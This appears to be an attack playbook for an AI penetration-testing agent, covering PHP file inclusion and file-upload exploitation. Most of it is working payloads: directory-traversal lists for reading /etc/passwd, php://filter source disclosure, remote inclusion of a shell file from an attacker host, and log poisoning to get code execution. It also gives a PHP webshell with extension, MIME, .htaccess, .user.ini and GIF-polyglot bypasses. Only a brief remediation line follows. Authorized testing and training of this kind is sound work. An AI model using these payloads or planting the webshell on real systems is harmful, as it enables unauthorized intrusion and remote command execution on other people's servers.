# File inclusion & upload (PHP)

## LFI / RFI
PHP `include($_GET['page'])` patterns. Test any `?page=`, `?file=`,
`?template=`, `?lang=`, `?view=` parameter.
- **LFI**: `?page=/etc/passwd`, `?page=../../../../etc/passwd`. Sweep traversal
  depths and targets in ONE `http_fuzz`: `url:".../?page=FUZZ"`,
  `match_regex:"root:.*:0:0:"`, `payloads:["/etc/passwd","../etc/passwd",
  "../../etc/passwd","../../../etc/passwd","../../../../etc/passwd"]` — a matched
  row pins the right depth. Read the PHP source via the filter wrapper:
  `?page=php://filter/convert.base64-encode/resource=index.php`, then base64-decode
  the body inside `browser_evaluate_js` (`atob`).
  Note: chained `php://filter` conversions (`convert.iconv.*`/`convert.base64-*`
  stacked dozens of times) can mutate bytes into executable PHP without a file
  write — only worth attempting through `include()` (not a plain read) if
  log-poisoning RCE above is blocked; it needs many chained filters, treat as a
  stretch goal.
- **RFI** (if `allow_url_include=On`): `?page=http://<your-host>/shell.txt`.
- **Log poisoning → RCE**: inject PHP into a header (e.g. `User-Agent` via
  `http_request`), then LFI the access/error log.
- **Path truncation** (legacy PHP <5.3/5.2, still seen on old CTF boxes): when
  the app appends a suffix (`include($_GET['page'].".php")`), overflow the
  internal path buffer so PHP silently drops the appended suffix — pad with
  ~2048-4096 repeated `./` (or `..\` ×~200 on Windows, MAX_PATH=260):
  `page=/etc/passwd/` + `./`×2048. If the response differs between a short and
  a 4096-byte padded traversal, truncation is live. Note: the classic null byte
  (`%00`) is dead since PHP 5.3.4 — don't waste a call on it unless
  fingerprinting shows an ancient version.

## File upload
If an `input[type=file]` exists:
1. Stage a webshell with `browser_upload_file` (filename `shell.php`, content
   `<?php system($_GET['c']); ?>`), then click the form's submit button.
2. Read the success message for the stored path, then `http_request`
   that path with `?c=id` to confirm RCE.
3. Test filter bypasses: double extension `shell.php.jpg`, `.phtml` / `.php5`,
   MIME spoof via the `Content-Type` header, trailing dot/space.
4. **Extension/case sweep in ONE `http_fuzz`**: marker on the filename
   extension, `payloads:["php","phtml","php3","php4","php5","php7","pht",
   "phar","pHp","php.jpg","php%00.jpg"]`, `match_status`/`match_regex` on the
   RCE echo from step 2's `?c=id`.
5. **Config-file upload** (target dir allows arbitrary filenames +
   `.htaccess`/`AllowOverride` on): upload a `.htaccess` containing
   `AddType application/x-httpd-php .jpg`, then a second file `shell.jpg` with
   PHP content — the directory now executes `.jpg` as PHP. On PHP-FPM/Nginx
   targets try `.user.ini` with `auto_prepend_file=shell.jpg` instead (no
   Apache/.htaccess needed).
6. **Polyglot**: prefix the webshell with a real magic number so content
   sniffing/`getimagesize()` checks pass: `GIF89a<?php system($_GET['c']);?>`.
   Combine with whichever extension bypass worked in step 4.

Evidence: file contents read (LFI) or command output (RCE).
Remediation: whitelist includable files; `allow_url_include=Off`; validate
upload extension AND content; store uploads outside the webroot and serve them
non-executable.
